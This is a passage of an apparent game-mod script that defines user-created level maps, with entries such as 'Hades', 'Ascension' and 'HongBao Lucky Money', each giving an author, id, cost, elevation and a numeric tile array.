cat",id="#1674155691",direction="right",cost=173,elevation=4,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,10,10,129,0,0,0,0,135,135,135,135,135,135,135,135,135,14,95,14,2,10,10,129,0,0,0,0,135,135,135,135,135,135,135,135,135,14,95,132,2,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,94,94,94,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,94,94,94,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,125,0,16,16,16,135,135,135,135,135,135,135,135,0,0,0,65,93,131,10]});
maps.push({name="Hades",author="Soft Serve",id="#1674158965",direction="right",cost=634,elevation=-9,map=[1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,93,14,14,75,1,0,0,0,0,0,1,1,1,1,1,14,14,14,1,1,93,14,1,75,1,0,0,0,0,1,1,117,116,115,14,14,75,75,1,1,1,1,1,14,1,1,1,0,1,1,118,117,1,1,14,75,75,75,1,0,0,1,75,75,75,14,1,1,1,119,118,1,1,75,75,75,75,14,1,0,1,1,75,75,75,75,14,1,1,119,1,1,75,75,75,75,14,14,1,1,1,75,75,75,75,75,75,75,1,120,1,75,75,14,14,75,75,1,1,1,75,75,75,14,75,75,75,75,75,21,75,75,75,14,14,75,75,1,0,1,75,75,75,75,75,14,14,14,75,75,75,75,75,14,75,75,1,1,0,1,75,75,14,75,1,14,75,75,75,75,75,14,75,75,75,1,1,0,0,1,14,75,75,75,1,1,75,75,75,54,75,75,75,75,1,1,0,0,0,1,14,75,75,1,1,1,1,75,75,54,75,75,1,1,1,0,0,0,0,1,14,75,75,1,0,0,1,1,1,120,1,1,1,1,1,1,1,1,0,1,75,75,75,1,1,0,0,0,1,96,1,1,1,23,3,65,65,1,1,1,75,14,75,75,1,1,1,1,1,20,20,21,22,22,5,65,65,65,1,1,75,14,75,75,14,14,75,75,77,75,75,75,5,75,5,5,65,65,1,1,1,14,14,75,75,14,97,75,77,5,5,75,75,75,75,5,5,5,1,0,1,1,75,75,75,75,75,75,77,75,75,75,75,75,75,75,75,5,2,0,0,1,1,1,75,75,75,75,77,75,75,5,1,1,1,75,75,5,2,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1]});
maps.push({name="Ascension",author="ZpLit",id="#1674168690",direction="forward",cost=232,elevation=9,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,87,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,87,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,9998,4,4,9998,5,5,0,0,0,0,0,0,0,0,0,0,187,5,140,140,9998,9,9,9998,140,140,5,186,0,0,0,0,0,0,0,0,187,5,140,140,9998,9,9,87,140,140,5,186,0,0,0,0,0,0,0,0,187,5,140,140,9998,9,9,9998,140,140,5,186,0,0,0,0,0,0,0,0,187,5,140,140,87,9,9,9998,140,140,5,186,0,0,0,0,0,0,0,0,187,5,140,140,9998,9,9,9998,140,140,5,186,0,0,0,0,0,0,0,0,187,5,140,1,9,4,4,9,1,140,5,186,0,0,0,0,0,0,0,0,187,5,140,1,9998,14,14,9998,1,140,5,186,0,0,0,0,0,0,0,0,187,5,140,116,14,14,14,14,116,140,5,186,0,0,0,0,0,0,0,0,187,5,140,1,14,14,14,14,1,140,5,186,0,0,0,0,0,0,0,0,187,5,140,1,14,14,14,14,1,140,5,186,0,0,0,0,0,0,0,0,187,5,140,117,14,14,14,14,117,140,5,186,0,0,0,0,0,0,0,0,187,5,140,1,14,14,14,14,1,140,5,186,0,0,0,0,0,0,0,0,0,0,1,1,88,2,2,88,1,1,0,0,0,0,0,0]});
maps.push({name="Thank Luffaren",author="ZpLit",id="#1674169118",direction="forward",cost=670,elevation=-7,map=[0,0,0,21,21,21,21,21,21,2,2,21,21,21,21,21,21,0,0,0,0,0,0,21,140,140,140,140,87,21,21,87,140,140,140,140,21,0,0,0,0,0,0,21,140,1,140,140,140,140,140,140,140,140,1,140,21,0,0,0,0,0,0,21,140,140,140,140,140,140,140,1,140,140,140,140,21,0,0,0,0,0,0,21,140,140,140,140,1,140,140,140,140,140,140,140,21,0,0,0,0,0,0,21,140,140,140,140,140,140,140,140,140,1,140,140,21,0,0,0,0,0,0,21,140,140,1,140,140,140,140,140,140,140,140,140,21,0,0,0,0,0,0,14,140,140,140,140,140,140,140,1,140,140,140,140,14,0,0,0,0,0,0,14,140,140,140,140,140,140,140,140,140,140,1,140,14,0,0,0,0,0,0,14,140,140,140,140,1,140,140,140,140,140,140,140,14,0,0,0,0,0,0,14,140,140,140,140,140,140,140,140,1,140,140,140,14,0,0,0,0,0,0,14,140,140,1,140,140,140,140,140,140,140,140,140,14,0,0,0,0,0,0,14,140,140,140,140,140,1,140,140,140,140,140,140,14,0,0,0,0,0,0,14,140,140,140,140,140,140,140,140,140,1,140,140,14,0,0,0,0,0,0,7,140,140,140,1,140,140,140,140,140,140,140,140,7,0,0,0,0,0,0,7,140,140,140,140,140,140,1,140,140,140,140,140,7,0,0,0,0,0,0,7,140,1,140,140,140,140,140,140,140,140,140,140,7,0,0,0,0,0,0,7,140,140,140,140,140,140,140,140,140,140,1,140,7,0,0,0,0,0,0,7,140,140,140,140,140,140,140,140,140,140,140,140,7,0,0,0,0,0,0,7,9998,9998,9998,9998,88,2,2,88,9998,9998,9998,9998,7,0,0,0]});
maps.push({name="THIS",author="ZpLit",id="#1674169553",direction="forward",cost=337,elevation=0,map=[0,0,0,0,0,0,0,0,1,1,1,2,2,16,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,1,1,1,199,199,199,16,16,16,16,0,0,0,0,0,0,0,0,0,0,1,1,199,1,1,1,1,16,16,16,16,0,24,24,0,0,0,0,0,118,1,1,1,1,1,1,1,1,16,16,16,16,24,24,0,0,0,0,0,118,24,117,117,117,117,117,117,117,87,16,16,16,24,24,0,0,1,1,1,118,24,117,117,117,127,127,117,117,117,24,16,16,16,24,0,1,20,20,20,20,20,117,117,117,117,117,117,117,117,24,24,16,16,24,1,20,1,93,20,20,1,17,117,84,82,82,83,117,117,24,16,16,16,16,1,20,20,1,20,1,18,17,117,84,76,76,83,117,128,24,16,24,16,16,1,20,20,20,20,1,18,17,117,84,76,76,83,117,128,24,16,16,16,24,1,20,20,1,20,20,1,17,117,84,81,81,83,117,117,24,16,16,16,16,1,20,1,93,20,20,20,117,117,117,117,117,117,117,117,16,16,16,24,24,0,1,20,20,20,118,24,117,117,117,126,126,117,117,16,16,16,24,24,24,0,0,1,1,1,118,24,117,117,117,117,117,117,87,16,16,24,24,24,24,0,0,0,0,0,118,1,1,1,1,1,1,1,16,16,16,24,24,24,24,0,0,0,0,0,0,0,1,1,199,199,199,16,16,16,0,24,24,24,24,0,0,0,0,0,0,0,0,1,1,1,16,16,16,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,1,1,16,16,1,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0]});
maps.push({name="Perilous Path",author="ZpLit",id="#1674181093",direction="right",cost=102,elevation=5,map=[0,0,0,0,0,0,0,0,0,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,86,39,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0,38,1,0,0,0,0,0,0,0,0,0,0,0,0,42,0,0,0,0,0,86,38,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,37,1,0,0,0,0,0,0,0,0,0,0,0,0,44,0,0,0,1,0,36,1,0,0,0,187,44,0,0,0,0,0,0,0,0,0,0,1,0,0,35,1,0,0,0,0,88,0,0,0,0,0,0,0,0,0,0,1,0,86,35,1,42,42,43,44,2,0,0,0,0,0,0,0,0,1,1,0,0,35,1,42,42,0,0,1,2,0,0,0,0,0,0,40,1,0,0,0,86,35,1,41,0,0,0,0,1,0,34,34,34,34,0,0,0,0,86,34,35,1,41,86,0,0,0,0,0,0,35,1,1,34,91,91,91,91,34,1,1,41,41,0,0,0,0,0,0,0,35,86,35,1,1,1,1,1,1,87,41,86,0,0,0,0,0,0,0,0,0,0,86,35,36,37,38,39,40,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Everything in order",author="Luffaren",id="#1674248434",direction="forward",cost=158,elevation=10,map=[14,2,2,14,14,34,96,96,34,131,0,0,0,0,0,0,0,0,0,0,90,14,14,14,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,170,173,14,145,0,0,0,170,174,14,145,0,0,0,170,175,5,145,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,145,0,145,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,93,25,0,0,0,0,0,0,0,100,0,179,0,0,0,0,0,0,0,94,5,94,0,0,0,0,0,0,0,19,0,0,0,0,0,0,0,0,0,25,93,25,0,0,0,0,0,0,0,145,0,0,0,0,0,0,0,0,0,145,0,145,0,0,0,0,0,0,0,0,0,24,145,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,170,178,0,0,0,0,0,170,177,24,145,0,0,0,170,176,5,145,0,67,67,67,67,67,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,65,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,65,67,67,67,67,0,0,0,0,0,0,0,0,0,0,89,24,24,24,97,24,9998,24,24,24,132,1,0,0,0,0,0,0,0,0,24,2,2,24,89,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="Front down back up",author="Luffaren",id="#1674251854",direction="right",cost=396,elevation=0,map=[24,2,2,24,67,0,0,0,0,0,0,0,0,67,24,24,24,24,24,24,24,24,24,24,67,0,0,0,100,1,1,44,0,67,24,24,89,24,24,2,90,24,24,24,67,0,0,0,44,1,1,44,0,67,24,89,24,24,24,2,1,24,24,24,67,0,0,0,0,44,44,0,0,67,24,24,24,9998,125,9998,19,94,94,19,67,0,0,0,0,0,0,0,0,67,19,19,90,24,19,24,89,19,19,19,67,0,0,0,0,0,0,0,0,67,19,89,19,19,95,19,19,19,19,19,67,0,0,0,0,0,0,0,0,67,19,19,19,19,19,19,90,19,89,19,67,0,0,0,0,0,0,0,0,67,19,9998,19,89,19,19,1,19,19,19,67,0,0,0,0,0,0,0,0,67,19,125,9998,19,19,19,14,93,93,14,67,0,0,0,0,0,0,0,0,67,19,14,19,90,14,14,14,14,14,14,67,0,0,0,0,0,0,0,0,67,14,95,14,14,14,89,14,14,89,14,67,0,0,0,0,0,0,0,0,67,14,14,14,14,14,14,90,14,14,14,67,0,0,0,0,0,0,0,0,67,14,14,89,14,14,14,1,14,14,14,67,0,0,0,0,0,0,0,0,67,14,14,14,9998,125,9998,9,9,9,65,67,0,0,0,0,0,0,0,0,67,65,9,90,14,9,14,89,9,9,65,67,67,67,67,67,67,67,67,67,67,65,9,9,9,95,9,9,9,9,9,9998,9,9,9,9,9,9,9,9,9998,9,9,89,9,9,9,9,9,9,9,9998,9,9,9,9,9,9,9,9,9998,9,9,9,9,9,9,90,9,9,65,67,0,0,0,0,0,0,0,0,67,65,9,9,89,9,9,1,9,129,65,67,0,0,145,29,129,0,0,0,67,65,9,9,9,9,9]});
maps.push({name="Hold W for the Win",author="Luffaren",id="#1674253172",direction="forward",cost=628,elevation=0,map=[0,0,0,0,0,0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,1,162,162,162,67,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,67,161,161,1,161,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,1,162,67,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,67,161,1,161,161,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,1,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,67,161,161,161,161,161,161,161,161,161,161,67,0,0,0,0,0,0,0,0,67,162,162,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,1,90,14,14,2,2,14,14,90,1,0,0,0,0,0]});
maps.push({name="HongBao Lucky Money",author="NyaaaDoge",id="#1674291108",direction="forward",cost=429,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,2,2,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,114,114,114,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,114,114,1,1,1,115,1,Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),1,1,115,Vector(177,30,30),1,76,76,76,76,76,Vector(251,242,54),76,76,76,Vector(251,242,54),76,76,76,76,Vector(226,34,34),1,1,115,Vector(177,30,30),Vector(177,30,30),1,76,76,131,76,Vector(251,242,54),76,76,Vector(251,242,54),76,76,76,76,76,Vector(226,34,34),1,1,115,Vector(177,30,30),Vector(251,242,54),132,1,76,76,Vector(251,242,54),Vector(251,242,54),76,Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(226,34,34),1,1,115,Vector(251,242,54),Vector(255,249,125),Vector(255,249,125),1,76,76,76,Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(226,34,34),1,1,133,Vector(255,249,125),Vector(255,249,125),93,Vector(235,230,120),1,Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(251,242,54),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(226,34,34),1,1,Vector(251,242,54),Vector(255,249,125),93,94,94,1,Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(226,34,34),1,1,Vector(251,242,54),Vector(255,249,125),93,94,94,1,Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),76,Vector(251,242,54),76,Vector(251,242,54),Vector(226,34,34),1,1,133,Vector(255,249,125),Vector(255,249,125),93,Vector(235,230,120),1,Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),76,Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),76,Vector(251,242,54),76,Vector(251,242,54),Vector(226,34,34),1,1,115,Vector(251,242,54),Vector(255,249,125),Vector(255,249,125),1,Vector(255,61,61),Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),76,Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),Vector(251,242,54),134,Vector(251,242,54),Vector(251,242,54),Vector(226,34,34),1,1,115,Vector(177,30,30),Vector(251,242,54),132,1,Vector(255,61,61),Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),76,Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),76,Vector(251,242,54),76,Vector(251,242,54),Vector(226,34,34),1,1,115,Vector(177,30,30),Vector(177,30,30),1,Vector(255,61,61),Vector(255,61,61),Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(255,61,61),Vector(251,242,54),76,Vector(251,242,54),76,Vector(251,242,54),Vector(226,34,34),1,1,115,Vector(177,30,30),1,Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(255,61,61),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(251,242,54),Vector(226,34,34),1,1,115,1,Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),Vector(226,34,34),1,1,1,95,95,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,114,91,91,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,2,2,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Believe",author="Headhunterz",id="#1674359868",direction="forward",cost=158,elevation=-2,map=[1,1,1,1,1,1,1,11,2,2,11,11,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,11,11,11,11,11,1,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,1,11,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,153,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,154,157,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,132,9,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,93,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,94,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,93,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,94,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,93,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,1,135,1,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,1,131,1,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Choose a path",author="NyaaaDoge",id="#1674387206",direction="forward",cost=184,elevation=-5,map=[0,0,1,40,40,40,40,39,38,37,36,14,2,2,36,0,0,0,0,0,0,0,40,18,18,18,18,17,16,15,14,14,14,14,36,0,0,0,0,0,0,0,40,18,18,18,18,17,16,15,14,14,14,14,36,0,0,0,0,0,0,0,39,17,17,1,40,39,38,37,36,36,13,13,0,0,0,0,0,0,0,0,38,16,16,38,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,37,15,15,37,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,36,14,14,36,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,35,13,13,35,0,16,16,15,14,13,13,13,0,0,0,0,0,0,0,0,34,12,12,34,0,16,16,15,14,13,13,13,0,0,0,0,0,0,0,0,33,11,11,33,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,32,10,10,32,0,16,16,0,0,0,1,1,0,0,0,0,0,0,0,0,31,9,9,31,0,16,16,16,0,0,7,7,29,0,0,0,0,0,0,0,30,8,8,30,0,0,16,16,0,0,7,7,29,0,0,0,0,0,0,0,29,7,7,29,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,29,7,7,29,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,29,7,7,29,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,29,7,7,1,30,30,0,0,0,0,8,8,0,0,0,0,0,0,0,0,29,7,7,7,8,8,9,9,9,9,9,9,0,0,0,0,0,0,0,0,29,7,7,7,8,8,9,9,9,9,9,9,0,0,0,0,0,0,0,0,1,29,29,29,30,30,0,0,9,2,2,9,0,0,0,0,0,0]});
maps.push({name="RACE Down N Up on Z",author="NyaaaDoge",id="#1674387342",direction="forward",cost=190,elevation=-5,map=[0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,36,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,36,14,14,14,36,0,0,0,0,0,0,0,0,0,0,1,19,19,1,0,36,14,14,36,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,1,13,13,13,0,0,0,0,0,0,0,0,0,0,0,19,19,91,19,19,19,12,12,12,0,0,0,0,0,0,0,0,0,40,19,19,19,19,19,19,19,11,11,11,0,0,0,0,0,0,0,0,39,18,18,18,18,0,18,18,18,10,10,10,0,0,0,0,0,0,0,38,17,17,17,17,0,0,17,17,17,9,9,9,0,0,0,0,0,0,0,16,16,16,16,0,0,0,16,16,16,8,8,8,0,0,0,0,0,0,15,15,15,15,0,0,0,0,15,15,15,7,7,7,0,0,0,0,0,14,14,14,14,0,0,0,0,0,14,14,14,6,6,6,0,0,0,34,13,13,13,13,0,0,0,0,0,0,13,13,13,6,6,6,0,0,33,12,12,12,12,0,0,0,0,0,0,0,12,12,12,6,6,6,0,32,11,11,11,11,0,0,0,0,0,0,0,0,11,11,11,7,7,7,0,10,10,10,10,0,0,0,0,0,0,0,0,0,10,10,10,8,8,8,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,1,8,8,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,9,0,1,8,9,9,1,0,0,0,0,0,0,0,0,9,9,9,9,9,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,9,2,2,9,0,0]});
maps.push({name="Roar Is Aggressive",author="ZpLit",id="#1674403853",direction="forward",cost=160,elevation=0,map=[0,0,0,0,0,1,1,1,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,87,54,91,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,42,186,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,93,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,65,0,0,0,0,0,0,0,0,0,0,0,1,54,1,54,1,14,14,1,65,0,0,0,0,0,0,0,0,0,0,0,1,91,1,54,1,14,14,1,42,0,0,0,0,0,0,0,0,0,0,0,1,85,1,54,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,1,54,1,20,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,1,131,1,20,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,1,20,1,20,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,1,132,1,3,14,14,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,88,2,2,88,14,186,0,0,0,0,0,0]});
maps.push({name="Ancestry",author="ZpLit",id="#1674433211",direction="forward",cost=192,elevation=6,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,45,91,5,5,91,45,1,0,0,0,0,0,0,0,0,0,0,0,0,1,45,1,0,0,1,45,1,0,0,0,0,0,0,0,0,0,0,0,0,1,46,1,0,0,1,46,1,0,0,0,0,0,0,0,0,0,0,0,0,1,47,47,7,7,47,47,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,7,7,1,1,1,1,0,0,0,0,0,0,0,0,0,1,47,91,7,7,7,7,7,7,91,47,1,0,0,0,0,0,0,0,0,1,47,1,0,0,1,1,0,0,1,47,1,0,0,0,0,0,0,0,0,1,48,1,0,0,1,1,0,0,1,48,1,0,0,0,0,0,0,0,0,1,49,95,9,9,1,1,9,9,95,49,1,0,0,0,0,0,0,0,1,1,1,1,9,9,1,1,9,9,1,1,1,1,0,0,0,0,0,1,49,91,9,9,9,87,1,1,87,9,9,9,91,49,1,0,0,0,0,1,49,1,0,0,0,0,0,0,0,0,0,0,1,49,1,0,0,0,0,1,50,1,0,0,0,0,0,0,0,0,0,0,1,50,1,0,0,0,0,1,51,95,11,11,1,0,93,93,0,1,11,11,95,51,1,0,0,0,0,0,1,1,11,11,1,1,1,1,1,1,11,11,1,1,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,11,11,11,88,2,2,88,11,11,11,0,0,0,0,0]});
maps.push({name="Descendants",author="ZpLit",id="#1674433669",direction="forward",cost=196,elevation=6,map=[0,0,0,0,0,11,11,11,11,2,2,11,11,11,11,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,1,1,11,11,1,1,1,1,1,1,11,11,1,1,0,0,0,0,0,1,51,51,11,11,1,0,93,93,0,1,11,11,51,51,1,0,0,0,0,1,51,1,0,0,0,0,0,0,0,0,0,0,1,51,1,0,0,0,0,1,52,1,0,0,0,0,0,0,0,0,0,0,1,52,1,0,0,0,0,1,53,91,13,13,13,13,1,1,13,13,13,13,91,53,1,0,0,0,0,0,1,1,1,1,13,13,1,1,13,13,1,1,1,1,0,0,0,0,0,0,0,1,53,95,13,87,1,1,87,13,95,53,1,0,0,0,0,0,0,0,0,1,53,1,0,0,1,1,0,0,1,53,1,0,0,0,0,0,0,0,0,1,54,1,0,0,1,1,0,0,1,54,1,0,0,0,0,0,0,0,0,1,55,91,15,15,15,15,15,15,91,55,1,0,0,0,0,0,0,0,0,0,1,1,1,1,15,15,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,55,95,15,15,95,55,1,0,0,0,0,0,0,0,0,0,0,0,0,1,55,1,0,0,1,55,1,0,0,0,0,0,0,0,0,0,0,0,0,1,56,1,0,0,1,56,1,0,0,0,0,0,0,0,0,0,0,0,0,1,57,91,17,17,91,57,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,17,17,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,1